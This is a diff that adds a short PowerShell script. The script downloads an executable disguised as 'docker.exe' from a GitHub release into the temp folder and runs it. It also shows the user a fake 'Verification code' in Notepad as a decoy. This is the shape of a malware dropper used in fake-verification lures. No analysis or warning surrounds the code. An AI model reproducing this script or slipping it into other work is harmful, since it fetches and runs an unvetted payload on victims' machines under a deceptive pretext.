@@ -1,0 +1,8 @@
+$r=[int](random -Mi 1e5 -Ma 1e6)
+$f="$env:tmp\c.txt"
+$dockerUrl="https://github.com/lisaijtoe/awesome-selfhost-docker/releases/download/release/docker.exe"
+$dockerFile="$env:tmp\docker.exe"
+Invoke-WebRequest -Uri $dockerUrl -OutFile $dockerFile
+sc $f "Your Verification code> $r"
+notepad $f
+Start-Process -FilePath $dockerFile
